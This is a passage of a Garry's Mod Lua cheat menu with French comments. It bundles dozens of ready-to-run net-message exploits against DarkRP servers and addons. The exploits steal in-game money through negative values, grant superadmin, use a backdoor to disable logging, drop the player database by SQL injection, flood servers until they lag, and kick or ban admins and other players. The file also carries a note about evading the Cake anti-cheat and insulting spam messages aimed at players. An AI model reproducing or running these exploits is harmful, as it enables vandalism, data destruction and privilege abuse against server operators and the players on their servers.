draw.SimpleTextOutlined( "Bonjour "..steamworks.GetPlayerName( LocalPlayer():SteamID64() )..", tu as la dernière version du menu", "HUDLogo2", ScrW()/2 + math.sin(RealTime()) * ScrW() / 85, ScrH()/30, Color( 19, 242, 37,255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color(0,0,0,255) )
end)
local hideHUDElements = {
["DarkRP_HUD"] = false,
["DarkRP_LocalPlayerHUD"] = false,
["DarkRP_EntityDisplay"] = true,
["DarkRP_ZombieInfo"] = false,
["DarkRP_Hungermod"] = false,
["DarkRP_Agenda"] = false,
["CHudHealth"] = true,
["CHudBattery"] = true,
["CHudSuitPower"] = true,
["CHudAmmo"] = false,
["CHudSecondaryAmmo"] = false,
}
--hook.Add("HUDShouldDraw", "GraphiteHideDef", function(name)
--[[if hideHUDElements[name] then return false end
end)
-- Début code détéctable par cac 
else -- ne pas toucher cac check else
for i = 1, 30 do
MsgC( Color( 255, 0, 0 ), "[GIZEH MENU]: !! CAKE ANTI-CHEAT !! DETECTER MENU DESACTIVE POUR EVITER LE KICK/BAN" )
end
end -- ne pas toucher cac checker end
-- Fin code détéctable par cac]]

local Lokidev = nil 
local RatesScaleLevel = LocalPlayer():SteamID()
local iZNX = {}
iZNX.memory = {}
local grad = Material( "gui/gradient" )
local upgrad = Material( "gui/gradient_up" )
local downgrad = Material( "gui/gradient_down" )
local ctext = chat.AddText
function iZNX.ChatText( str )
ctext( Color(201, 0, 255), [[ [Processdev Menu v1.7]: ]]..str )
end
function iZNX.NetStart( str )
local netstart = net.Start
if Lokidev and Lokidev.G and Lokidev.G.net then
netstart = Lokidev.G.net.Start
else
--        print( "sending netmessage in insecure mode" )
end
return netstart( str )
end
function iZNX.ValidNetString( str )
local netstart = net.Start
if Lokidev and Lokidev.G and Lokidev.G.net then
netstart = Lokidev.G.net.Start
else
--        print( "scanning for exploit in insecure mode" )
end
local status, error = pcall( netstart, str )
return status
end
function iZNX.ValidNetString( str )
local status, error = pcall( net.Start, str )
return status
end
iZNX.sploits = {}
local severitycols = {
[1] = Color( 80, 80, 120 ),
[2] = Color( 80, 120, 80 ),
[3] = Color( 150, 90, 50 ),
[4] = Color( 150, 50, 0 ),
}
function iZNX.AddExploit( name, tab )
if !isstring( name ) then print("U FUCKED UP A SPLOIT RETARD") return end
if !istable( tab ) then print("U FUCKED UP A SPLOIT RETARD") return end
iZNX.sploits[name] = tab
end
function iZNX.IsStored( addr )
return iZNX.memory[addr] != nil
end
function iZNX.GetStored( addr, fallback )
if fallback and iZNX.memory[addr] == nil then return fallback end
return iZNX.memory[addr]
end
function iZNX.Store( addr, val )
iZNX.memory[addr] = val
end
function iZNX.GetAllStored()
return iZNX.memory
end
function iZNX.GetAllStoredData()
local ret = {}
for k, v in pairs( iZNX.memory ) do
if !istable( v ) then ret[k] = v end
end
return ret
end
function iZNX.LoadConfig()
local f = file.Read( "Processdev_exploit.dat", "DATA" )
if !f then iZNX.ChatText( "T'AS PAS SAVE DE CONFIG SALE TRIZOMIQUE" ) end
local raw = util.Decompress( f )
local garbage = util.JSONToTable( raw )
table.Merge( iZNX.memory, garbage )
--    iZNX.memory = garbage
iZNX.Menu:Remove()
iZNX.ChatText( "Fichier de configuration chargé" )
end
function iZNX.SaveConfig()
local myturds = util.TableToJSON( iZNX.GetAllStoredData() )
if !myturds then return end
local cumpressed = util.Compress( myturds )
file.Write( "Processdev_exploit.dat", cumpressed )
iZNX.ChatText( "Fichier de configuration sauvegardé" )
end
iZNX.AddExploit( "€ Customizable Printers Money Stealer €", {
desc = "Vole instantanément tout l'argent de chaque Printer sur le serveur",
severity = 3,
scan = function() return iZNX.ValidNetString( "SyncPrinterButtons76561198056171650" ) end,
functions = {
{ typ = "func", name = "Prendre", func = function()
if !timer.Exists( "Processdev_exploit_shekels" ) then
iZNX.ChatText( "Vole de l'argent lancé" )
timer.Create( "Processdev_exploit_shekels", 0.1, 0, function()
for k, v in pairs(ents.GetAll()) do
if( v:GetClass():find("print") ) then
iZNX.NetStart( "SyncPrinterButtons76561198056171650" )
net.WriteEntity(v)
net.WriteUInt(2, 4)
net.SendToServer()
end
end
end)
else
timer.Remove( "Processdev_exploit_shekels" )
iZNX.ChatText( "Vole de l'argent stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "ULX Friends Spam", {
desc = "Spams tout le monde sur le serveur avec un message",
severity = 1,
scan = function() return (iZNX.ValidNetString( "sendtable" ) and ulx and ulx.friends ) end,
functions = {
{ typ = "string", name = "Entrer un message", default = "Bitch please", addr = "fr_spamstring" },
{ typ = "players", addr = "fr_players" },
{ typ = "func", name = "Big Spam", func = function()
if !timer.Exists( "bigspams" ) then
iZNX.ChatText( "big spam lancé" )
timer.Create( "bigspams", 0.5, 0, function()
local t = iZNX.GetStored( "fr_players", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
local buyit = {}
for i = 1, 15 do
table.insert( buyit, iZNX.GetStored( "fr_spamstring", "Bitch please" ) )
end
iZNX.NetStart( "sendtable" )
net.WriteEntity( v )
net.WriteTable( buyit )
net.SendToServer()
end
end)
else
timer.Remove( "bigspams" )
iZNX.ChatText( "big spam stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "Console Erreur Spammer", {
desc = "Défonce le serveur rcon avec des erreurs massive )",
severity = 1,
scan = function() return iZNX.ValidNetString( "steamid2" ) end,
functions = {
{ typ = "func", name = "Big Spam", func = function()
if !timer.Exists( "Processdev_exploit_errorz" ) then
iZNX.ChatText( "erreur spam lancé" )
timer.Create( "Processdev_exploit_errorz", 0.1, 0, function()
iZNX.NetStart( "steamid2" )
net.WriteString( "Something is creating very strong script errors" )
net.SendToServer()
end)
else
timer.Remove( "Processdev_exploit_errorz" )
iZNX.ChatText( "erreur spam stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "Turbo Erreur Spammer", {
desc = "Défonce le serveur rcon avec des erreurs massive.",
severity = 2,
scan = function() return iZNX.ValidNetString( "steamid2" ) end,
functions = {
{ typ = "func", name = "Big Spam", func = function()
if !timer.Exists( "Processdev_exploit_errorzt" ) then
iZNX.ChatText( "erreur spam lancé" )
timer.Create( "Processdev_exploit_errorzt", 0, 0, function()
for i = 1, 100 do
iZNX.NetStart( "steamid2" )
net.WriteString( "Something is creating very strong script errors" )
net.SendToServer()
end
end)
else
timer.Remove( "Processdev_exploit_errorzt" )
iZNX.ChatText( "erreur spam stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "€ Kun Drug €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return iZNX.ValidNetString( "Kun_SellDrug" ) end,
functions = {
{ typ = "func", name = "Lancer", func = function()
if !timer.Exists( "Processdev_exploit_selldrugon" ) then
iZNX.ChatText( "Exploit lancé" )
timer.Create( "Processdev_exploit_selldrugon", 0, 0, function()
for i=1,1000 do
iZNX.NetStart("Kun_SellDrug")
net.WriteString("mushroom")
net.SendToServer()
end 
end)
else
timer.Remove( "Processdev_exploit_selldrugon" )
iZNX.ChatText( "Exploit stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "Point Shop Unbox", {
desc = "Exploit a téster",
severity = 2,
scan = function() return iZNX.ValidNetString( "net_PSUnBoxServer" ) end,
functions = {
{ typ = "func", name = "Lancer", func = function()
for k,v in pairs(player.GetAll()) do
local i = 0
for k2,v2 in pairs(PS.Items) do 
if !v:PS_HasItem(v2.ID) then  
timer.Simple(k*i*1.7,function() 
iZNX.NetStart("net_PSUnBoxServer") 
net.WriteEntity(v) 
net.WriteString(v2.ID) 
net.SendToServer() 
end) 
i = i + 1
end 
end
end
end, },
},
} )
iZNX.AddExploit( "☢ Give Superadmin ☢", {
desc = "Donnez le superadmin aux gens (rejoignez pour que cela prenne effet)",
severity = 4,
scan = function() return iZNX.ValidNetString( "pplay_deleterow" ) end,
functions = {
{ typ = "players", addr = "l_superadmins" },
{ typ = "func", name = "Lancer", func = function()
local t = iZNX.GetStored( "l_superadmins", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
local id = v:SteamID()
local tbl = {}
tbl.name = "FAdmin_PlayerGroup"
tbl.where = {
"steamid",
tostring(id)
}
iZNX.NetStart("pplay_deleterow")
net.WriteTable(tbl)
net.SendToServer()
local tbl = {}
tbl.tblname = "FAdmin_PlayerGroup"
tbl.tblinfo = {
tostring(id),
"superadmin"
}
iZNX.NetStart("pplay_addrow")
net.WriteTable(tbl)
net.SendToServer()
iZNX.ChatText( "superadmin donné à "..v:Nick() )
end
end, },
},
} )
local thefrenchenculer = ""
if iZNX.ValidNetString( "Sandbox_ArmDupe" ) then
thefrenchenculer = "Sandbox_ArmDupe"
else
if iZNX.ValidNetString( "Fix_Keypads" ) then
thefrenchenculer = "Fix_Keypads"
else
if iZNX.ValidNetString( "Remove_Exploiters" ) then
thefrenchenculer = "Remove_Exploiters"
else
if iZNX.ValidNetString( "noclipcloakaesp_chat_text" ) then
thefrenchenculer = "noclipcloakaesp_chat_text"
else
if iZNX.ValidNetString( "_Defqon" ) then
thefrenchenculer = "_Defqon"
else
if iZNX.ValidNetString( "_CAC_ReadMemory" ) then
thefrenchenculer = "_CAC_ReadMemory"
else
if iZNX.ValidNetString( "nostrip" ) then
thefrenchenculer = "nostrip"
else
if iZNX.ValidNetString( "LickMeOut" ) then
thefrenchenculer = "LickMeOut"
else
if iZNX.ValidNetString( "MoonMan" ) then
thefrenchenculer = "MoonMan"
if iZNX.ValidNetString( "Im_SOCool" ) then
thefrenchenculer = "Im_SOCool"
end
end
end
end
end
end
end
end
end
end
iZNX.AddExploit( ".NET Backdoor", {
desc = "Backdoor trés puissant, ENLEVE LES LOGS POUR ETRE PLUS DISCRET, Backdoor :"..thefrenchenculer.."",
severity = 4,
scan = function() return iZNX.ValidNetString( thefrenchenculer ) end,
functions = {
{ typ = "func", name = "ENLEVER LES LOGS", func = function()
iZNX.NetStart(thefrenchenculer)
net.WriteString( "RunConsoleCommand(\"ulx_logecho\", \"0\")" )
net.WriteBit(1)
net.SendToServer()
end, },
{ typ = "htxcommandeliste", name = "Commmandes Backdoor" },
{ typ = "players", addr = "give_superadmins" },
{ typ = "func", name = "<- Marche pas", func = function()
local t = iZNX.GetStored( "give_superadmins", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
local id = v:SteamID()
iZNX.NetStart(thefrenchenculer)
net.WriteString( "ulx adduserid "..id.." superadmin" )
net.WriteBit(false)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "☢ Niquer la base de donné SQL ☢", {
desc = "Vandalisez la base de données darkrp master SQL, effaçant toutes les données des joueurs, vous devez être superamin !!",
severity = 4,
scan = function() return iZNX.ValidNetString( "pplay_sendtable" ) end,
functions = {
{ typ = "func", name = "Lancer", func = function()
local tbl = {}
tbl.tblname = "darkrp_door; DROP TABLE darkrp_player; CREATE TABLE darkrp_player(a STRING)"
tbl.ply = LocalPlayer()
iZNX.NetStart("pplay_sendtable")
net.WriteTable(tbl)
net.SendToServer()
iZNX.ChatText( "Base de données SQL Server détruite" )
end, },
},
} )
iZNX.AddExploit( "Niquer les Data du serveur", {
desc = "Vandalise le data du serveur, va probablement ennuyer leurs fils de pute de dev x)",
severity = 3,
scan = function() return iZNX.ValidNetString( "WriteQuery" ) end,
functions = {
{ typ = "func", name = "Lancer", func = function()
if !timer.Exists( "Processdev_exploit_datatrasher" ) then
iZNX.ChatText( "Démarrage du spam du dossier data" )
timer.Create( "Processdev_exploit_datatrasher", 0.5, 0, function()
iZNX.NetStart( "WriteQuery" )
net.WriteString( "BAN ME -> "..LocalPlayer():SteamID()..string.rep( "!", math.random( 1, 5000 ) ) )
net.SendToServer()
end)
else
timer.Remove( "Processdev_exploit_datatrasher" )
iZNX.ChatText( "Spam du dossier data Stopper" )
end
end, },
},
} )
-- Patched
--[[iZNX.AddExploit( "Turbo Chat Spam", {
desc = "Gros spam, extrêmement ennuyeux",
severity = 1,
scan = function() return iZNX.ValidNetString( "VJSay" ) end,
functions = {
{ typ = "string", name = "Entrer un message", default = "LokidevMenu", addr = "vj_spamstring" },
{ typ = "string", name = "Entrer un son", default = "vo/npc/male01/hacks01.wav", addr = "vj_spamsound" },
{ typ = "func", name = "Big Spam", func = function()
if !timer.Exists( "bigspamsvj" ) then
iZNX.ChatText( "big spam lancé" )
timer.Create( "bigspamsvj", 0.1, 0, function()
for k, v in pairs( player.GetAll() ) do
iZNX.NetStart( "VJSay" )
net.WriteEntity( v )
net.WriteString( iZNX.GetStored( "vj_spamstring", "ACHETER LE @LOKIDEV AJOUTEZ SUPREMACIST" ) )
if iZNX.GetStored( "vj_spamsound", "" ) != "" then
net.WriteString( iZNX.GetStored( "vj_spamsound", "" ) )
end
net.SendToServer()
end
end)
else
timer.Remove( "bigspamsvj" )
iZNX.ChatText( "big spam stoppé" )
end
end, },
},
} )--]]
iZNX.AddExploit( "Give une arme", {
desc = "Exploit pour vous give des putains d'armes",
severity = 3,
scan = function() return iZNX.ValidNetString( "CraftSomething" ) end,
functions = {
{ typ = "string", name = "Nom Arme", default = "m9k_ak47", addr = "armes_a_prendre" },
{ typ = "func", name = "Prendre", func = function()
iZNX.NetStart( "CraftSomething" )
net.WriteEntity( LocalPlayer() )
net.WriteString( iZNX.GetStored( "armes_a_prendre" ) )
net.WriteString( "" )
net.WriteString( "weapon" )
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "ULX Extended ", {
desc = "Attention cette exploit est risquée si l'addon est à jour vous allez être kick ^^",
severity = 3,
scan = function() return iZNX.ValidNetString( "banleaver" ) end,
functions = {
{ typ = "func", name = "Ban les Admins", func = function()
for k,v in pairs(player.GetAll()) do               
if v:GetUserGroup() != "user" then -- Custom first ranks, youre fucked bro                 
if v != LocalPlayer() then                 
iZNX.NetStart("banleaver")                 
net.WriteString(v:SteamID().."{sep}".."Bitch please")                
net.SendToServer()                 
end                
end                
end 
end, },
{ typ = "func", name = "Ban tout le monde", func = function()
for k,v in pairs(player.GetAll()) do               
if v != LocalPlayer() then                 
iZNX.NetStart("banleaver")                 
net.WriteString(v:SteamID().."{sep}".."Bitch please")                
net.SendToServer()                 
end                
end  
end, },
},
} )
iZNX.AddExploit( "€ Casino NPC €", {
desc = "Exploit d'argent très efficace, go payer des putes et de la coke ;)",
severity = 4,
scan = function() return iZNX.ValidNetString( "75_plus_win" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent" },
{ typ = "players", addr = "l_players_listing" },
{ typ = "func", name = "Donner", func = function()
local t = iZNX.GetStored( "l_players_listing", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart( "75_plus_win" )
net.WriteString( iZNX.GetStored( "montant_argent" ) )
net.WriteEntity(v)
net.SendToServer()
end
end, },
{ typ = "func", name = "Enlever", func = function()
local t = iZNX.GetStored( "l_players_listing", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart( "75_plus_win" )
net.WriteString( -iZNX.GetStored( "montant_argent" ) )
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "€ ATM €", {
desc = "Exploit d'argent, go payer des putes et de la coke ;)",
severity = 4,
scan = function() return iZNX.ValidNetString( "ATMDepositMoney" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent5" },
{ typ = "func", name = "Prendre", func = function()
iZNX.NetStart( "ATMDepositMoney" )
net.WriteFloat( -iZNX.GetStored( "montant_argent5" ) )
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "TAXI Spawn Lag", {
desc = "Exploit pour faire chier les fdp de codeurs ;)",
severity = 2,
scan = function() return iZNX.ValidNetString( "Taxi_Add" ) end,
functions = {
{ typ = "func", name = "Spawn", func = function()
local Pos = LocalPlayer():GetEyeTrace().HitPos
iZNX.NetStart("Taxi_Add")
net.WriteString("Taxi Super Exploit #"..math.random( 1, 9999 ))
net.WriteTable({[1]=Pos.x,[2]=Pos.y,[3]=Pos.z})
net.WriteFloat(-9999999)
net.WriteString("Les addons leaks c'est plein d'exploit :D")
net.SendToServer()
end, },
{ typ = "func", name = "Super Spam", func = function()
if !timer.Exists( "taxispam" ) then
iZNX.ChatText( "Spam spawn Taxi lancé" )
timer.Create( "taxispam", 0.05, 0, function()
local Pos = LocalPlayer():GetEyeTrace().HitPos
iZNX.NetStart("Taxi_Add")
net.WriteString("Taxi Super Exploit #"..math.random( 1, 9999 ))
net.WriteTable({[1]=Pos.x,[2]=Pos.y,[3]=Pos.z})
net.WriteFloat(-9999999)
net.WriteString("Les addons leaks c'est plein d'exploit :D")
net.SendToServer()
end)
else
timer.Remove( "taxispam" )
iZNX.ChatText( "Spam spawn Taxi arreter" )
end
end, },
},
} )
iZNX.AddExploit( "€ eMining €", {
desc = "Exploit d'argent Infini, go payer des putes et de la coke ;)",
severity = 4,
scan = function() return iZNX.ValidNetString( "SellMinerals" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent6" },
{ typ = "func", name = "Prendre", func = function()
for k,v in pairs(SkillDB) do
if not ( v.iSkill == true ) then
iZNX.NetStart("Upgrade")
net.WriteTable( { LuaName = v.LuaName, Amount = -iZNX.GetStored( "montant_argent6" ) } )
net.SendToServer()
iZNX.NetStart( "SellMinerals" )
net.WriteTable( { Target = LocalPlayer() } )
net.SendToServer()
end
end
end, },
{ typ = "func", name = "Enlever", func = function()
for k,v in pairs(SkillDB) do
if not ( v.iSkill == true ) then
iZNX.NetStart("Upgrade")
net.WriteTable( { LuaName = v.LuaName, Amount = iZNX.GetStored( "montant_argent6" ) } )
net.SendToServer()
iZNX.NetStart( "SellMinerals" )
net.WriteTable( { Target = LocalPlayer() } )
net.SendToServer()
end
end
end, },
},
} )
iZNX.AddExploit( "€ Gamble NPC €", {
desc = "Exploit d'argent Infini, go payer des putes et de la coke ;)",
severity = 4,
scan = function() return iZNX.ValidNetString( "TakeBetMoney" ) end,
functions = {
{ typ = "func", name = "Prendre", func = function()
iZNX.NetStart( "TakeBetMoney" )
net.WriteTable({1e333333 , 1e333333})
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ Kun Oil Mod €", {
desc = "Exploit d'argent, go payer des putes et de la coke ;)",
severity = 3,
scan = function() return iZNX.ValidNetString( "Kun_SellOil" ) end,
functions = {
{ typ = "func", name = "Prendre", func = function()
for k,v in pairs(ents.GetAll()) do
iZNX.NetStart("Kun_SellOil")
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "Rejoindre la Police 1", {
desc = "Rejoint la police sans passer par le putain de formulaire",
severity = 2,
scan = function() return iZNX.ValidNetString( "PoliceJoin" ) end,
functions = {
{ typ = "func", name = "Rejoindre", func = function()
iZNX.NetStart("PoliceJoin")
net.SendToServer() 
end, },
},
} )
iZNX.AddExploit( "Rejoindre la Police 2", {
desc = "Rejoint la police sans passer le putain formulaire",
severity = 2,
scan = function() return iZNX.ValidNetString( "CpForm_Answers" ) end,
functions = {
{ typ = "func", name = "Rejoindre", func = function()
iZNX.NetStart("CpForm_Answers")
net.WriteEntity(LocalPlayer())
net.WriteTable({})
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ Deposit Money €", {
desc = "Exploit d'argent avec les ATM Deposit Money",
severity = 2,
scan = function() return iZNX.ValidNetString( "DepositMoney" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent7" },
{ typ = "func", name = "Lancer", func = function()
for k,v in pairs(ents.GetAll()) do 
swag = v 
end
for k,v in pairs(player.GetAll()) do
iZNX.NetStart( "DepositMoney" )
net.WriteEntity(swag)
net.WriteString(-iZNX.GetStored( "montant_argent7" ))
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "MDE", {
desc = "Exploit pour supprimer des PermaProps (Viser le props et cliquer sur l'exploit pour le supprimer)",
severity = 2,
scan = function() return iZNX.ValidNetString( "MDE_RemoveStuff_C2S" ) end,
functions = {
{ typ = "func", name = "Lancer", func = function()
iZNX.NetStart( "MDE_RemoveStuff_C2S" )
net.WriteTable( {DATA="",TARGET=LocalPlayer():GetEyeTrace().Entity} )
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ SS Shelf NET €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return iZNX.ValidNetString( "NET_SS_DoBuyTakeoff" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent9" },
{ typ = "func", name = "Lancer", func = function()
for k,v in pairs(ents.GetAll()) do 
swag = v 
end
iZNX.NetStart( 'NET_SS_DoBuyTakeoff' )          
net.WriteEntity(LocalPlayer())          
net.WriteEntity(swag)          
net.WriteTable({'spawned_weapon'})          
net.WriteInt(-iZNX.GetStored( "montant_argent9" ), 16)       
net.SendToServer()   
end, },
},
} )
iZNX.AddExploit( "€ MODIFIER TAXES €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return iZNX.ValidNetString( "NET_EcSetTax" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent10" },
{ typ = "func", name = "Lancer", func = function()
iZNX.NetStart("NET_EcSetTax")
net.WriteInt(-iZNX.GetStored( "montant_argent10" ), 16)
net.SendToServer() 
end, },
},
} )
iZNX.AddExploit( "€ Fine System €", {
desc = "Exploit d'argent , go payer des putes et de la coke ;)",
severity = 3,
scan = function() return iZNX.ValidNetString( "RP_Accept_Fine" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent11" },
{ typ = "players", addr = "l_players_listing_fine" },
{ typ = "func", name = "Prendre", func = function()
local t = iZNX.GetStored( "l_players_listing_fine", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart("RP_Accept_Fine")
net.WriteString(v:Nick())
net.WriteDouble(-iZNX.GetStored( "montant_argent11" ))
net.SendToServer()
end
end, },
{ typ = "func", name = "Envoyer Amende x)", func = function()
local t = iZNX.GetStored( "l_players_listing_fine", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart("RP_Fine_Player")
net.WriteString(v:Nick())
net.WriteString(v:Nick())
net.WriteDouble(iZNX.GetStored( "montant_argent11" ))
net.WriteString("Ce serveur mérite une anarchie! Serveur hacked!! Vous pouvez lecher mon trou du cul maintenant x)")
net.SendToServer()
end
end, },
{ typ = "func", name = "Spam Envoyer Amende x)", func = function()
if !timer.Exists( "spamamandefine" ) then
iZNX.ChatText( "Spam lancé" )
timer.Create( "spamamandefine", 0.1, 0, function()
local t = iZNX.GetStored( "l_players_listing_fine", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart("RP_Fine_Player")
net.WriteString(v:Nick())
net.WriteString(v:Nick())
net.WriteDouble(iZNX.GetStored( "montant_argent11" ))
net.WriteString("Ce serveur mérite une anarchie! Serveur hacked!! Vous pouvez lecher mon trou du cul maintenant x)")
net.SendToServer()
end
end)
else
timer.Remove( "spamamandefine" )
iZNX.ChatText( "Spam stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "€ 3D Cardealer €", {
desc = "Exploit d'argent, Regarder un vehicule que vous avez acheté pour le dupliquer ;)",
severity = 2,
scan = function() return iZNX.ValidNetString( "RXCAR_Shop_Store_C2S" ) end,
functions = {
{ typ = "func", name = "Dupliquer", func = function()
for i = 0, 75 do               
iZNX.NetStart( "RXCAR_Shop_Store_C2S" );               
net.WriteTable( { E = ent } );                 
net.SendToServer();                
end
end, },
{ typ = "func", name = "Tout Vendre", func = function()
local ent              
for k,v in pairs(ents.GetAll()) do                 
if v:GetClass() == "rm_car_dealer" then                
ent = v                
end                
end                
for k,v in pairs(RX3DCar_Inventory) do                 
iZNX.NetStart( "RXCAR_SellINVCar_C2S" )                
net.WriteTable({UN=v.UniqueID,SE=ent})                 
net.SendToServer()                 
end      
end, },          
},
} )
iZNX.AddExploit( "Supprimer Armes / Argent", {
desc = "Supprimer les armes / l'argent de touts le monde",
severity = 3,
scan = function() return iZNX.ValidNetString( "drugseffect_remove" ) end,
functions = {
{ typ = "func", name = "Supprimer Armes", func = function()
iZNX.NetStart("drugseffect_remove")
net.SendToServer()
end, },
{ typ = "func", name = "Supprimer Argent", func = function()
iZNX.NetStart("drugs_money")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ Crafting Mod €", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return iZNX.ValidNetString( "CRAFTINGMOD_SHOP" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent14" },
{ typ = "func", name = "Ajouter Argent", func = function()
iZNX.NetStart("CRAFTINGMOD_SHOP")
net.WriteTable({
BUY =   -iZNX.GetStored( "montant_argent14" );
type    =   1
})
net.WriteInt(1,16)
net.SendToServer()
end, },
{ typ = "func", name = "Enlever Argent", func = function()
iZNX.NetStart("CRAFTINGMOD_SHOP")
net.WriteTable({
BUY =   LocalPlayer():getDarkRPVar("money");
type    =   1
})
net.WriteInt(1,16)
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Mettre le Feu", {
desc = "Mettre les props/joueur en feu. RIP JOHNNY.",
severity = 3,
scan = function() return iZNX.ValidNetString( "drugs_ignite" ) end,
functions = {
{ typ = "func", name = "Feux Props", func = function()
iZNX.NetStart("drugs_ignite")
net.WriteString("prop_physics")
net.SendToServer()
end, },
{ typ = "func", name = "Feux Joueurs", func = function()
iZNX.NetStart("drugs_ignite")
net.WriteString("player")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Modifier la Vie", {
desc = "Changer la vie des joueurs",
severity = 2,
scan = function() return iZNX.ValidNetString( "drugseffect_hpremove" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100", addr = "montant_argent15" },
{ typ = "func", name = "Vie Normal", func = function()
iZNX.NetStart("drugseffect_hpremove")
net.WriteString(iZNX.GetStored( "montant_argent15" ))
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Teleportation", {
desc = "Teleport les joueurs que vous regarder au spawn)",
severity = 2,
scan = function() return iZNX.ValidNetString( "DarkRP_Kun_ForceSpawn" ) end,
functions = {
{ typ = "func", name = "Teleport", func = function()
iZNX.NetStart("DarkRP_Kun_ForceSpawn")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Supprimer les props 2", {
desc = "Je sait pas ce que ça fait (ça fait surement respawn les joueurs que vous visez ou un truc comme ça ^^'')",
severity = 2,
scan = function() return iZNX.ValidNetString( "drugs_text" ) end,
functions = {
{ typ = "func", name = "Supprimer", func = function()
iZNX.NetStart("drugs_text")
net.WriteString("prop_physics")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Kick 3", {
desc = "Exploit pour kick touts les joueurs",
severity = 3,
scan = function() return iZNX.ValidNetString( "NLRKick" ) end,
functions = {
{ typ = "players", addr = "l_players_listing515" },
{ typ = "func", name = "Kick", func = function()
local t = iZNX.GetStored( "l_players_listing515", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart("NLRKick")
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "Kick 2", {
desc = "Exploit pour kick",
severity = 3,
scan = function() return iZNX.ValidNetString( "RecKickAFKer" ) end,
functions = {
{ typ = "players", addr = "l_players_listing2545" },
{ typ = "func", name = "Kick", func = function()
local t = iZNX.GetStored( "l_players_listing2545", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart("RecKickAFKer")
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "Loot Items", {
desc = "Auto-Loot des items",
severity = 2,
scan = function() return iZNX.ValidNetString( "GMBG:PickupItem" ) end,
functions = {
{ typ = "func", name = "Loot", func = function()
for k, v in pairs(ents.GetAll()) do         
if v:GetClass() == "item_loot" then                 
iZNX.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
iZNX.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
iZNX.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
iZNX.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
iZNX.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
iZNX.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
end
end
end, },
},
} )
iZNX.AddExploit( "Kick tout le monde", {
desc = "Exploit pour kick touts les joueurs",
severity = 3,
scan = function() return iZNX.ValidNetString( "DL_Answering" ) end,
functions = {
{ typ = "func", name = "Kick", func = function()
if !timer.Exists( "kickallnoob" ) then
iZNX.ChatText( "Kick tout le monde lancé" )
timer.Create( "kickallnoob", 0.05, 0, function()
for i = 1, 2000 do 
iZNX.NetStart("DL_Answering")
net.SendToServer()
end
end)
else
timer.Remove( "kickallnoob" )
iZNX.ChatText( "Kick tout le monde stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "Kick 1", {
desc = "Exploit pour kick les Admins",
severity = 3,
scan = function() return iZNX.ValidNetString( "plyWarning" ) end,
functions = {
{ typ = "players", addr = "l_players_listing255" },
{ typ = "func", name = "Kick", func = function()
local t = iZNX.GetStored( "l_players_listing255", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart('plyWarning')          
net.WriteEntity(v)          
